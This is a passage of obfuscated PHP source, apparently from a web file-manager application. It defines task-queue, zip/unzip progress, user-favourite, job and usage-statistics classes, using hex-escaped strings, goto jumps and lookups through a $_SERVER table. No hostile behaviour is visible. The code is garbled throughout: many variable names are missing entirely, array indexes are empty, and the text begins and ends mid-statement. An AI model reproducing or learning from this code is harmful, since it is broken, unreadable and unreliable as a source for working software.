$[$옴[32]], $옴[194] => $[$옴[194]], $옴[33] => isset($[$옴[33]]) ? $[$옴[33]] : 1, $옴[2325] => isset($[$옴[2325]]) ? $[$옴[2325]] : 0, $옴[784] => 0, $옴[210] => 0); return parent::insert($ܵض); } public function userNoticeEdit($č, $Ќ߇ر) { $this->initUserOption(); return parent::update($č, $Ќ߇ر); } } goto CŜ; bԾ: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\153\x51\x75\x65\165\x65\114\x65\x6e\x67\x74\x68"; const QUEUE_DATA = "\x74\x61\163\153\x51\x75\x65\x75\145\x44\141\164\x61"; const QUEUE_TIME = "\x74\141\163\153\121\x75\145\x75\x65\114\141\x73\164\122\165\156"; const QUEUE_THREAD = "\x74\x61\163\x6b\x51\x75\x65\x75\x65\124\150\162\145\141\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($픐, $뱯 = array(), $И = '', $ = '') { $򼰢 =& $_SERVER[]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($ && array_find_by_field(self::$listData, $򼰢[94], $)) { return !0; } if ($ && array_find_by_field(self::$listDataAdd, $򼰢[94], $)) { return !0; } self::$listDataAdd[] = array($򼰢[308] => $픐, $򼰢[1785] => $뱯, $򼰢[494] => $И, $򼰢[94] => $); return !0; } public static function addSubmit() { $ᇪ =& $_SERVER[]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($ᇪ[1786] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $ᇪ[12], $ᇪ[494])), $ᇪ[185]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($О, $δ = array(), $і = '', $ٗ = '') { $Ϻ =& $_SERVER[]; if (self::count() >= self::MAX_LENGTH) { return !1; } $ٖ = self::getAll(); if ($ٗ && array_find_by_field($ٖ, $Ϻ[94], $ٗ)) { return !0; } $ٖ[] = array($Ϻ[308] => $О, $Ϻ[1785] => $δ, $Ϻ[494] => $і, $Ϻ[94] => $ٗ); self::setAll($ٖ); write_log($Ϻ[1786] . $і, $Ϻ[185]); return !0; } public static function run() { $ =& $_SERVER[]; $ۊ = self::getAll(); $ = array_shift($ۊ); if (!$) { return !1; } self::setAll($ۊ); $է = timeFloat(); $ = $[12]; try { $ = Hook::apply($[$[308]], $[$[1785]]); } catch (Exception $ڑ) { write_log($ڑ, $[1221]); } $ = number_format(timeFloat() - $է, 3) . $[1703]; if ($ && is_string($)) { $ = $ . $[1787] . $; } write_log($[1788] . $[$[494]] . $[1789] . $, $[185]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $߀ =& $_SERVER[]; $ = self::threadCount() + 1; if ($ > 3 || !self::count()) { return; } write_log($߀[1790] . $, $߀[185]); Cache::set(self::QUEUE_THREAD, $, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } usleep(mt_rand(200, 50000)); } Cache::set(self::QUEUE_THREAD, 0, 3600 * 24); write_log($߀[1791], $߀[185]); } public static function getKey($, $ = "\151\x6e\164") { $ϭ =& $_SERVER[]; Cache::removeMemory($); $ݼ = Cache::get($); if ($ == $ϭ[332]) { return $ݼ ? intval($ݼ) : 0; } if ($ == $ϭ[1792]) { return is_array($ݼ) ? $ݼ : array(); } return $ݼ; } public static function lastTime() { return self::getKey(self::QUEUE_TIME); } public static function count() { return self::getKey(self::QUEUE_LENGTH); } public static function threadCount() { return self::getKey(self::QUEUE_THREAD); } public static function getAll() { return self::getKey(self::QUEUE_DATA, $_SERVER[][1792]); } public static function setAll($) { $龝 = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($), $龝); Cache::set(self::QUEUE_DATA, $, $龝); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); Cache::set(self::QUEUE_THREAD, 0, 60); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($ι, $򳱙 = 5.0) { if (!$ι) { return; } $ = Cache::get($ι); if (!$ || timeFloat() - floatVal($) >= $򳱙) { Cache::set($ι, timeFloat(), $򳱙 * 10); return !0; } return !1; } public static function timeLimitCall($ʪ, $ӑ, $ǡܸ, $䢗 = 5.0) { $ȵ =& $_SERVER[]; if (!$ʪ || !$ӑ) { return; } self::$asyncAdd = !0; $ж = $ȵ[1793]; $ = Cache::get($ж, !0); $ = array($ȵ[1794] => timeFloat(), $ȵ[1795] => timeFloat(), $ȵ[308] => $ӑ, $ȵ[1785] => $ǡܸ, $ȵ[194] => $䢗); if (is_array($[$ʪ])) { $[$ȵ[1795]] = $[$ʪ][$ȵ[1795]]; } if (is_array($[$ʪ])) { if (timeFloat() - $[$ʪ][$ȵ[1794]] < $[$ȵ[194]] * 0.3) { return; } $[$ȵ[1795]] = $[$ʪ][$ȵ[1795]]; } $[$ʪ] = $; Cache::set($ж, $, 60); Cache::removeMemory($ж); write_log($ȵ[1796] . $ʪ . $ȵ[71] . $ӑ, $ȵ[185]); } public static function timeLimitCallLoop() { $Մ =& $_SERVER[]; $ы = array($Մ[1797]); $ = in_array(strtolower(ACTION), $ы); if (!$ && !self::$asyncAdd) { return; } $ = $Մ[1793]; $҇ = Cache::get($, !0); if (!$҇ || count($҇) <= 0) { return; } $ = !1; $» = timeFloat(); $ = array(); foreach ($҇ as $ => $) { if ($» - $[$Մ[1795]] > $[$Մ[194]]) { $ = !0; try { Hook::apply($[$Մ[308]], $[$Մ[1785]]); write_log($Մ[1798] . $ . $Մ[71] . $[$Մ[308]] . $Մ[1799] . ACTION, $Մ[185]); } catch (Exception $) { } continue; } $[$] = $; } if (!$) { return; } if (!$) { return Cache::remove($); } Cache::set($, $, 60); Cache::removeMemory($); } public static function finished($, $) { $߳ =& $_SERVER[]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($߳[308] => $, $߳[1785] => $); } private static function finishedRun() { $ҟ =& $_SERVER[]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $) { try { Hook::apply($[$ҟ[308]], $[$ҟ[1785]]); } catch (Exception $) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ʽ =& $_SERVER[]; parent::startAfter(); Hook::bind($ʽ[1800], array($this, $ʽ[1801])); Hook::bind($ʽ[1234], array($this, $ʽ[1802])); Hook::bind($ʽ[1803], array($this, $ʽ[1804])); $ڒ쪁 =& $this->task; $ڒ쪁[$ʽ[1805]] = $ʽ[1235]; if (!$ڒ쪁[$ʽ[1584]]) { $ڒ쪁[$ʽ[1584]] = LNG($ʽ[1806]); } } protected function endAfter() { $֐ =& $_SERVER[]; parent::endAfter(); Hook::unbind($֐[1800], array($this, $֐[1801])); Hook::unbind($֐[1234], array($this, $֐[1802])); Hook::unbind($֐[1803], array($this, $֐[1804])); } public function updateAfter() { $®ĸ =& $_SERVER[]; $ǆѢ =& $this->task; if (!$ǆѢ[$®ĸ[820]] || !$ǆѢ[$®ĸ[797]]) { if ($ǆѢ[$®ĸ[1805]] != $®ĸ[357]) { return; } } if ($ǆѢ[$®ĸ[1805]] == $®ĸ[1235]) { $ = 0; if ($ǆѢ[$®ĸ[1740]]) { $ = $ǆѢ[$®ĸ[1741]] / $ǆѢ[$®ĸ[1740]]; } $ǆѢ[$®ĸ[1689]] = $ * 0.3; } else { if ($ǆѢ[$®ĸ[1805]] == $®ĸ[357]) { $ = $ǆѢ[$®ĸ[1688]] / $ǆѢ[$®ĸ[820]]; $ǆѢ[$®ĸ[1689]] = 0.3 + $ * 0.4; } else { if ($ǆѢ[$®ĸ[1805]] == $®ĸ[107]) { $ٌ = 0; if ($ǆѢ[$®ĸ[1742]] == $®ĸ[107]) { $ٌ = $ǆѢ[$®ĸ[1741]]; } $ = ($ǆѢ[$®ĸ[1745]] + $ٌ) / $ǆѢ[$®ĸ[797]]; $ǆѢ[$®ĸ[1689]] = 0.3 + 0.4 + $ * 0.3; } } } if ($ǆѢ[$®ĸ[1689]] > 0) { $ɍ = timeFloat() - $ǆѢ[$®ĸ[1691]] - $ǆѢ[$®ĸ[1694]]; $ǆѢ[$®ĸ[1695]] = $ɍ * (1 - $ǆѢ[$®ĸ[1689]]) / $ǆѢ[$®ĸ[1689]]; } } public function addFile($) { $ =& $_SERVER[]; $ =& $this->task; $˶ = IO::info($); $[$[1738]] = $˶[$[32]]; $[$[1740]] = $˶[$[76]]; $[$[1741]] = 0; $[$[1103]] = $[1761]; $[$[1742]] = $[1235]; $[$[797]] = $˶[$[76]]; $[$[820]] = 1; $풂 = 0; $[$[1749]] = array($[1750] => $풂 + 1, $[462] => $˶[$[32]], $[84] => $˶[$[84]], $[551] => $˶[$[551]] ? $˶[$[551]] : $˶[$[84]]); $this->update(); } public function zipEvent($¸, $͐, $, $ԫߞ) { $ѝ =& $_SERVER[]; $񶀌 =& $this->task; $񶀌[$ѝ[1738]] = get_path_this($͐); $񶀌[$ѝ[1740]] = $ԫߞ; $񶀌[$ѝ[1741]] = $; $񶀌[$ѝ[1103]] = $¸ == $ѝ[1807] ? $ѝ[1808] : $ѝ[1809]; $񶀌[$ѝ[1742]] = $ѝ[12]; $񶀌[$ѝ[797]] = $ԫߞ; $񶀌[$ѝ[1805]] = $ѝ[357]; $this->update(); } public function unzipAfter($) { $ =& $_SERVER[]; $ =& $this->task; $[$[1805]] = $[107]; $֩ = IO::infoWithChildren($); $հ = 0; $[$[1749]] = array($[1750] => $հ + 1, $[462] => $֩[$[32]], $[84] => $֩[$[84]], $[551] => $֩[$[551]] ? $֩[$[551]] : $֩[$[84]]); if ($֩[$[33]] == $[214]) { $[$[820]] = 1; } else { $[$[820]] = $֩[$[79]][$[77]]; } $[$[1103]] = $[12]; $[$[1742]] = 0; $[$[1688]] = 0; $[$[1740]] = 0; $[$[1741]] = 0; $[$[1738]] = $[12]; $[$[1745]] = 0; $[$[797]] = $֩[$[76]]; $this->update(); self::log($[1810] . json_encode(array($, $֩))); } public function nameParse($) { $ =& $_SERVER[]; $ =& $this->task; if ($[$[1805]] == $[1235]) { $[$[1805]] = $[357]; $[$[1745]] = 0; $[$[797]] = 0; } $ = get_path_this($); if (strstr($, $[10])) { $[$[1688]] += 1; $[$[820]] += 1; } $[$[1738]] = $; $this->update(); } } goto C; AՇ: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\155\56\x74\141\163\x6b\114\151\163\x74"; public $field = array("\156\141\155\145", "\164\x79\160\x65", "\x65\166\145\156\164", "\x74\151\x6d\145", "\x64\145\x73\x63", "\x73\x79\163\164\x65\155", "\145\156\x61\x62\154\145", "\154\141\163\x74\122\x75\x6e", "\x73\157\162\164"); public function listData($ = false, $ = "\163\157\162\x74", $焀 = false) { return parent::listData($, $, $焀); } public function add($⫔) { $ =& $_SERVER[]; $ = $this->findByName($⫔[$[32]]); if ($) { return !1; } $⫔[$[1644]] = 0; $⫔[$[1909]] = $this->getSort(); return parent::insert($⫔); } private function getSort() { $ύ =& $_SERVER[]; $ٙ = parent::listData(); $ = array_to_keyvalue($ٙ, $ύ[12], $ύ[1909]); return empty($) ? 0 : max($) + 1; } public function update($ӆ, $Ú) { $ю =& $_SERVER[]; $ޑ = $this->listData($ӆ); $뼥 = $this->findByName($Ú[$ю[32]]); if (!$ޑ || $뼥 && $뼥[$ю[443]] != $ޑ[$ю[443]]) { return !1; } return parent::update($ӆ, $Ú); } public function remove($̏, $ = false) { $˒ =& $_SERVER[]; $ޢ = $this->listData($̏); if (!$ޢ) { return; } if (!$ && $ޢ[$˒[179]] == $˒[88]) { return !1; } return parent::remove($̏); } public function enable($ʤۂ, $μ۪) { return $this->update($ʤۂ, array($_SERVER[][2321] => $μ۪)); } public function run($ɺͳ) { return $this->update($ɺͳ, array($_SERVER[][2333] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($) { $« =& $_SERVER[]; return array($«[1996] => array(USER_ID, $«[2334])); } protected function listData() { $ =& $_SERVER[]; $ = array($[1678] => USER_ID, $[525] => 0); $ = $[2335]; $ƍ = $this->field($)->where($)->order($[2336])->select(); return $ƍ ? $ƍ : array(); } protected function resetCache() { } protected function listView() { $ِ =& $_SERVER[]; $ = $this->listData(); $ = array_filter_by_field($, $ِ[33], $ِ[458]); $ͥ = array_to_keyvalue($, $ِ[12], $ِ[84]); if (!$ͥ) { return $; } $ݏ = 2000; $ = array($ِ[459] => array($ِ[460], $ͥ)); $΍ = Model($ِ[859])->listSource($, $ݏ); $΍ = array_merge($΍[$ِ[83]], $΍[$ِ[82]]); $΍ = array_to_keyvalue($΍, $ِ[181]); foreach ($ as $ۓ => $) { $ƈ = $΍[$[$ِ[84]]]; $ƈ = $ƈ ? $ƈ : array(); $[$ۓ] = array_merge($ƈ, $); } return $; } protected function addFav($숎, $ = '', $ = "\x73\x6f\x75\162\143\145") { $Ү =& $_SERVER[]; $曼 = array($Ү[1678] => USER_ID, $Ү[525] => 0, $Ү[464] => $, $Ү[463] => $숎); if ($this->where($曼)->find()) { return !1; } $曼 = array($Ү[1678] => USER_ID, $Ү[525] => 0); $تҠ = $this->where($曼)->max($Ү[1909]); if (!$تҠ) { $تҠ = 0; } if (!$ && $ == $Ү[458]) { $ = Model($Ү[1373])->where(array($Ү[459] => $숎))->find(); if (!$) { return !1; } $ = $[$Ү[32]]; } $ = $this->getAutoName($); $ = array($Ү[1678] => USER_ID, $Ү[525] => 0, $Ү[462] => $, $Ү[463] => $숎, $Ү[464] => $, $Ү[1889] => $تҠ + 1); return $this->add($); } protected function remove($⇃) { $Թ =& $_SERVER[]; $ = array($Թ[1678] => USER_ID, $Թ[461] => $⇃); return $this->where($)->delete(); } protected function removeByName($։) { $٨ =& $_SERVER[]; $ج = array($٨[1678] => USER_ID, $٨[462] => $։, $٨[525] => 0); return $this->where($ج)->delete(); } protected function rename($, $) { $ߋ =& $_SERVER[]; if ($ == $) { return !1; } $Ϫ = $this->getAutoName($); if ($ != $Ϫ) { return !1; } $ذՕ = array($ߋ[1678] => USER_ID, $ߋ[525] => 0, $ߋ[32] => $); return $this->where($ذՕ)->save(array($ߋ[32] => $)); } protected function resetSort($պڏ) { $ =& $_SERVER[]; $պڏ = is_array($պڏ) ? $պڏ : array(); $С = array($[1678] => USER_ID); for ($ = 0; $ < count($պڏ); $++) { $С[$[461]] = $պڏ[$]; $this->where($С)->save(array($[1889] => $ + 1)); } return !0; } protected function moveTop($ݱ) { $ =& $_SERVER[]; $В = array($[1678] => USER_ID, $[525] => 0); $ = $this->where($В)->where(array($[32] => $ݱ))->find(); if (!$) { return; } $ݖ = $this->field($[443])->where($В)->order($[2336])->select(); $ݖ = array_to_keyvalue($ݖ, $[12], $[443]); $ = $ݖ; $ݖ = array_remove_value($ݖ, $[$[443]]); array_unshift($ݖ, $[$[443]]); return $this->resetSort($ݖ); } protected function moveBottom($) { $í =& $_SERVER[]; $ǃ̘ = array($í[1678] => USER_ID, $í[525] => 0); $ = $this->where($ǃ̘)->max($í[1909]); $Ǩז = array($í[1909] => $ + 1); return $this->where($ǃ̘)->where(array($í[32] => $))->save($Ǩז); } private function getAutoName($߮) { $Τ =& $_SERVER[]; $ = array($Τ[1678] => USER_ID, $Τ[525] => 0); $ = $this->field($Τ[32])->where($)->select(); $ = array_to_keyvalue($, $Τ[12], $Τ[32]); if (!$ || !in_array($߮, $)) { return $߮; } for ($ = 0; $ < count($); $++) { if (!in_array($߮ . "\50{$}\x29", $)) { return $߮ . "\x28{$}\x29"; } } return $߮ . "\50{$}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\x6d\56\x6a\x6f\x62\x4c\151\x73\164"; public $field = array("\156\x61\155\x65", "\144\x65\163\x63", "\163\x6f\x72\164"); const JOB_KEY = "\163\x65\x6c\146\x4a\157\x62\x4c\x69\x73\164"; public function listData($ׯ = false, $ȗ = "\163\157\x72\164", $ɒ = false) { return parent::listData($ׯ, $ȗ, $ɒ); } public function remove($) { return parent::remove($); } public function add($ݦϲ) { $Ц =& $_SERVER[]; if ($this->findByName($ݦϲ[$Ц[32]])) { return !1; } $ݦϲ[$Ц[1909]] = $this->getSort(); return parent::insert($ݦϲ); } private function getSort() { $վ =& $_SERVER[]; $ = parent::listData(); $Ϊ = array_to_keyvalue($, $վ[12], $վ[1909]); return empty($Ϊ) ? 0 : max($Ϊ) + 1; } public function update($, $ą) { $ =& $_SERVER[]; $𴟍 = parent::listData($); $ = $this->findByName($ą[$[32]]); if (!$𴟍 || $ && $[$[443]] != $𴟍[$[443]]) { return !1; } return parent::update($, $ą); } public function setUserJob($, $) { $ =& $_SERVER[]; if (!is_array($)) { $ = array($); } $؆ = parent::listData(); $ = array_to_keyvalue($؆, $[32]); $ = $[422]; foreach ($ as $) { if ($[$]) { $ .= $[$][$[443]] . $[50]; } else { $ = $this->add($); $ .= $ . $[50]; } } $ = rtrim($, $[50]); Model($[567])->metaSet($, self::JOB_KEY, $); } public function getUserJob($Ó) { $ = Model($_SERVER[][567])->metaGet($Ó); return $this->getUserJobInfo($[self::JOB_KEY]); } public function getUserJobInfo($窆) { $ =& $_SERVER[]; $ = explode($[50], $窆); $ܸ = parent::listData(); $ܸ = array_remove_key($ܸ, $[215]); $׫ = array(); foreach ($ as $) { if (isset($ܸ[$])) { $׫[] = $ܸ[$]; } } return $׫; } } goto eڟ; C: class TaskZip extends TaskFileTransfer { protected function startAfter() { $ż =& $_SERVER[]; parent::startAfter(); Hook::bind($ż[1811], array($this, $ż[1801])); Hook::bind($ż[1803], array($this, $ż[1804])); $ԛ =& $this->task; $ԛ[$ż[1805]] = $ż[1235]; if (!$ԛ[$ż[1584]]) { $ԛ[$ż[1584]] = LNG($ż[1812]); } } protected function endAfter() { $ײ =& $_SERVER[]; parent::endAfter(); Hook::unbind($ײ[1811], array($this, $ײ[1801])); Hook::unbind($ײ[1803], array($this, $ײ[1804])); } public function updateAfter() { $ =& $_SERVER[]; $ =& $this->task; if (!$[$[820]] || !$[$[797]]) { return; } if ($[$[1805]] == $[1235]) { $ = $[$[1741]]; if ($[$[1742]] != $[1235]) { $ = 0; } $攣 = ($[$[1745]] + $) / $[$[797]]; $[$[1689]] = $攣 * 0.3; } else { if ($[$[1805]] == $[357]) { $攣 = $[$[1688]] / $[$[820]]; $[$[1689]] = 0.3 + $攣 * 0.5; } else { if ($[$[1805]] == $[107]) { $攣 = 0; if ($[$[1740]]) { $攣 = $[$[1741]] / $[$[1740]]; } $[$[1689]] = 0.3 + 0.5 + $攣 * 0.2; } } } if ($[$[1689]] > 0) { $ = timeFloat() - $[$[1691]] - $[$[1694]]; $[$[1695]] = $ * (1 - $[$[1689]]) / $[$[1689]]; } } public function copyFileStart($, $Ŗ, $ڜ, $팘, $񍮹, $) { $˖ =& $_SERVER[]; parent::copyFileStart($, $Ŗ, $ڜ, $팘, $񍮹, $); $ݺ =& $this->task; if ($ݺ[$˖[1805]] == $˖[357]) { $ݺ[$˖[1805]] = $˖[107]; } $this->update(); } public function copyFileEnd($ϐ, $, $ܽ, $堻, $, $ۡ) { $ܟ =& $_SERVER[]; $ =& $this->task; $[$ܟ[1741]] = $[$ܟ[1740]]; $[$ܟ[1745]] += $[$ܟ[1740]]; $[$ܟ[1742]] = $ܟ[12]; $this->update(); } public function zipEvent($Ь߮, $÷, $Ž, $ȱ) { $ =& $_SERVER[]; $·ڣ =& $this->task; $·ڣ[$[1738]] = get_path_this($÷); $·ڣ[$[1740]] = $ȱ; $·ڣ[$[1741]] = $Ž; $·ڣ[$[1103]] = $Ь߮ == $[1813] ? $[1808] : $[1809]; $·ڣ[$[1742]] = $[12]; $·ڣ[$[797]] = $ȱ; $·ڣ[$[1805]] = $[357]; $this->update(); } public function nameParse($рƢ) { $市 =& $_SERVER[]; $퉬 =& $this->task; if ($퉬[$市[1688]] < $퉬[$市[820]]) { $Ŀš = get_path_this($рƢ); if (strstr($Ŀš, $市[10])) { $퉬[$市[1688]] += 1; } } if ($퉬[$市[1805]] == $市[1235]) { $퉬[$市[1805]] = $市[357]; } $퉬[$市[1738]] = $рƢ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ɔ) { $ܔ =& $_SERVER[]; $Ϣ˺ = array($ܔ[630] => array($ܔ[33] => $ܔ[1814], $ܔ[317] => array($ܔ[239], $ܔ[799], $ܔ[1815], $ܔ[1816])), $ܔ[1817] => array($ܔ[33] => $ܔ[1818], $ܔ[317] => array($ܔ[239], $ܔ[797], $ܔ[1819], $ܔ[1820], $ܔ[1821]))); if (!isset($Ϣ˺[$ɔ])) { return !1; } $this->optionType = $Ϣ˺[$ɔ][$ܔ[33]]; $this->field = $Ϣ˺[$ɔ][$ܔ[317]]; return !0; } public function listData($ = false, $ӴԺ = "\x6d\x6f\x64\x69\146\171\x54\x69\155\x65", $ = false) { return parent::listData($, $ӴԺ, $); } public function trendList($඘) { $څ =& $_SERVER[]; $҆զ = $this->listData(); if ($҆զ) { $ = end($҆զ); $滎 = date($څ[1822], strtotime($څ[1823])); if ($[$څ[239]] == $滎) { return $҆զ; } $ǐ؁ = strtotime($[$څ[239]]); } if (!isset($ǐ؁)) { $׿ = $඘ == $څ[630] ? $څ[567] : $څ[859]; $ǐ؁ = Model($׿)->min($څ[215]); } $٬ = $څ[1824] . ucfirst($඘); $犅 = $this->dateList($ǐ؁); foreach ($犅 as $滎) { $this->{$٬}($滎); } return $this->listData(); } private function dateList($Ƨş) { $ =& $_SERVER[]; $ְ˕ = $Ƨş; $Ο = strtotime($[1823]); $ˉ = array(); while ($ְ˕ <= $Ο) { $ˉ[] = date($[1822], $ְ˕); $ְ˕ = strtotime($[1825], $ְ˕); } return $ˉ; } public function _recordUser($ = '') { $ =& $_SERVER[]; $ʉ = strtotime(date($[1826], strtotime($))); $ = strtotime(date($[1827], strtotime($))); $ = array($[215] => array($[1052], $)); $ = Model($[567])->where($)->count($[1687]); $[$[215]] = array($[377], array($ʉ, $)); $ˋ = Model($[567])->where($)->count($[1687]); $[$[33]] = $[1828]; $黧 = Model($[1829])->where($)->count($[1830]); $ = array($[239] => $, $[799] => (int) $, $[1815] => (int) $ˋ, $[1816] => (int) $黧); return $this->insert($); } public function _recordStore($ = '') { $ؐ =& $_SERVER[]; $ܧ = strtotime(date($ؐ[1827], strtotime($))); $ٖ۟ = array($ؐ[215] => array($ؐ[1052], $ܧ)); $ = Model($ؐ[512])->where($ٖ۟)->sum($ؐ[76]); $ٖ۟[$ؐ[453]] = 0; $Ŏ = Model($ؐ[859])->where($ٖ۟)->sum($ؐ[76]); $ٖ۟[$ؐ[178]] = 1; $ = Model($ؐ[859])->where($ٖ۟)->sum($ؐ[76]); $ٖ۟[$ؐ[178]] = 2; $ݨ = Model($ؐ[859])->where($ٖ۟)->sum($ؐ[76]); $ڂ = array($ؐ[239] => $, $ؐ[797] => (int) $Ŏ, $ؐ[1819] => (int) $, $ؐ[1820] => (int) $, $ؐ[1821] => (int) $ݨ); return $this->insert($ڂ); } public function trend($, $܋) { $ן =& $_SERVER[]; if (!$this->init($)) { return !1; } $ = $this->trendList($); if ($ && $܋ != $ן[1660]) { $߬ = $[0][$ן[239]]; $ = $this->validDate($܋, $߬); $򔩩 = array(); $ܮ = array_to_keyvalue($, $ן[239]); foreach ($ as $½) { if (isset($ܮ[$½])) { $۠ = $ܮ[$½]; } else { $۠ = end($); $۠[$ן[239]] = $½; if ($ == $ן[630]) { $۠[$ן[1815]] = $۠[$ן[1816]] = 0; } } $򔩩[] = $۠; } $ = $򔩩; } $ = array($ן[630] => array($ן[799] => LNG($ן[1831]), $ן[1815] => LNG($ן[1832]), $ן[1816] => LNG($ן[1833])), $ן[1817] => array($ן[797] => LNG($ן[1834]), $ן[1819] => LNG($ן[1835]), $ן[1820] => LNG($ן[1836]), $ן[1821] => LNG($ן[1837]))); $㻒 = array($ן[630] => $ן[1838], $ן[1817] => $ן[76]); if (empty($)) { $½ = date($ן[1822], strtotime($ן[1823])); $Ǝ = array($ן[239] => $½); foreach ($[$] as $Ρ => $) { $Ǝ[$Ρ] = 0; } $[] = $Ǝ; } $ް = array(); foreach ($ as $) { if ($ == $ן[1817] && $[$ן[1819]] > $[$ן[797]]) { $[$ן[1819]] = $[$ן[797]]; } foreach ($[$] as $Ρ => $) { $۠ = array($ן[239] => $[$ן[239]], $ן[1584] => $); $۠[$㻒[$]] = isset($[$Ρ]) ? $[$Ρ] : 0; $ް[] = $۠; } } return $ް; } public function validDate($٩, $Ǿэ) { $̭ =& $_SERVER[]; $ = date($̭[1822], strtotime($̭[1823])); $ = array($); switch ($٩) { case $̭[1667]: $ = mktime(0, 0, 0, date($̭[1839]), date($̭[1401]) - date($̭[1464]) + 7 - 7, date($̭[1840])); $젒 = 0; do { $۰ѡ = date($̭[1822], $ - 3600 * 24 * 7 * $젒); $[] = $۰ѡ; $젒++; } while ($Ǿэ < $۰ѡ); break; case $̭[1665]: $젒 = 1; do { $ߺǼ = date($̭[1841], strtotime("\55\x20{$젒}\40\155\157\x6e\164\150\163")); $[] = $ߺǼ; $젒++; } while ($Ǿэ < $ߺǼ); break; case $̭[1842]: $ = (int) date($̭[1840], strtotime($Ǿэ)); $ = (int) date($̭[1840]); if ($ >= $) { break; } for ($; $ < $; $++) { $[] = $ . $̭[1843]; } break; default: break; } if ($Ǿэ > end($)) { array_pop($); } sort($); return $; } public function listTable($) { $ = ucfirst($); return Model($)->listData(); } public function option($эՁ) { $ = $_SERVER[][1844] . ucfirst($эՁ); return $this->{$}(); } private function optionUser() { $ˀب =& $_SERVER[]; $ך = Model($ˀب[567])->count($ˀب[1687]); $٧ = Model($ˀب[567])->where($ˀب[1845])->count($ˀب[1687]); $꩖א = intval($GLOBALS[$ˀب[6]][$ˀب[393]][$ˀب[1639]]) / 3600; $ʥ = strtotime("\55{$꩖א}\x20\150\x6f\x75\x72\x73"); $ܱ = strtotime(date($ˀب[1826])); if ($ʥ < $ܱ) { $ʥ = $ܱ; } $Э = array($ˀب[1846] => array($ˀب[1053], $ʥ)); $ = (int) Model($ˀب[567])->where($Э)->count($ˀب[1687]); if (!$) { $ = 1; } $Э = array($ˀب[1846] => array($ˀب[1053], $ܱ)); $Ȋ = Model($ˀب[567])->where($Э)->count($ˀب[1687]); return array($ˀب[792] => (int) $ך, $ˀب[1847] => (int) ($ך - $٧), $ˀب[1848] => (int) $٧, $ˀب[1849] => (int) $Ȋ, $ˀب[1850] => $); } private function optionFile() { $ =& $_SERVER[]; $Ӽ = $this->sourceSize(); $ = $Ӽ[$[76]]; $Ӑ = $Ӽ[$[1819]]; $ = Model($[859])->where(array($[453] => 0))->count($[181]); $ = array($[453] => 0, $[215] => array($[1053], strtotime(date($[1826])))); $ɫ = Model($[859])->where($)->sum($[76]); $әو = Model($[859])->where($)->count($[181]); return array($[797] => $, $[1819] => $Ӑ, $[1851] => $ - $Ӑ, $[1852] => (int) $ɫ, $[799] => (int) $, $[1853] => (int) $әو); } private function optionAccess() { $ӱѾ =& $_SERVER[]; return array($ӱѾ[792] => $this->typeLogCnt(), $ӱѾ[107] => $this->typeLogCnt($ӱѾ[107]), $ӱѾ[493] => $this->typeLogCnt($ӱѾ[493]), $ӱѾ[1854] => $this->typeLogCnt($ӱѾ[1854]), $ӱѾ[1855] => $this->typeLogCnt($ӱѾ[1855]), $ӱѾ[630] => $this->typeLogCnt($ӱѾ[12], $ӱѾ[1830])); } private function typeLogCnt($ٽ = '', $ŀ¦ = "\x69\144") { $ =& $_SERVER[]; $б = array($[107] => array($[1856], $[1857]), $[493] => array($[1858], $[1859]), $[1854] => array($[1860], $[1861], $[1862]), $[1855] => array($[1863], $[1864]), $[1865] => array($[1866], $[1867], $[1868])); $ = strtotime(date($[1826])); $բ = array($[215] => array($[1053], $)); if ($ٽ) { $բ[$[33]] = array($[7], $б[$ٽ]); } $󔘃Ǝ = Model($[1829])->where($բ)->count($ŀ¦); return (int) $󔘃Ǝ; } private function optionServer() { $ؘ =& $_SERVER[]; $ʕǪ = $this->diskDriver(); $ז = KodIO::defaultDriver(); $¥ = array($ؘ[851] => $ז[$ؘ[443]]); $ňް = Model($ؘ[512])->where($¥)->sum($ؘ[76]); $ = explode($ؘ[53], $_SERVER[$ؘ[144]]); $ƪ = $[0]; $턴 = $GLOBALS[$ؘ[6]][$ؘ[21]]; $ = $턴[$ؘ[1015]]; if ($ == $ؘ[1003]) { $ = explode($ؘ[1323], $턴[$ؘ[1014]]); $ = $[0]; } if ($ == $ؘ[951] || $ == $ؘ[838]) { $ؠ = Model()->db()->query($ؘ[1869]); $ = $ؠ[0] && isset($ؠ[0][$ؘ[1583]]) ? $ؠ[0][$ؘ[1583]] : 0; $ = $ؘ[1870] . ($ ? $ؘ[8] . $ : $ؘ[12]); } $с變 = $GLOBALS[$ؘ[6]][$ؘ[393]][$ؘ[861]]; return array($ؘ[1871] => $ʕǪ ? $ʕǪ[$ؘ[1872]] : 0, $ؘ[1873] => $ʕǪ ? $ʕǪ[$ؘ[1874]] : 0, $ؘ[1875] => (int) $ז[$ؘ[1872]] * 1024 * 1024 * 1024, $ؘ[1876] => (int) $ňް, $ؘ[1877] => ucfirst($ƪ), $ؘ[1878] => $ؘ[1879] . PHP_VERSION, $ؘ[1880] => phpBuild64() ? 64 : 32, $ؘ[791] => str_replace($ؘ[1169], $ؘ[1031], $), $ؘ[393] => ucfirst($с變), $ؘ[32] => $_SERVER[$ؘ[1881]]); } private function diskDriver() { $ =& $_SERVER[]; 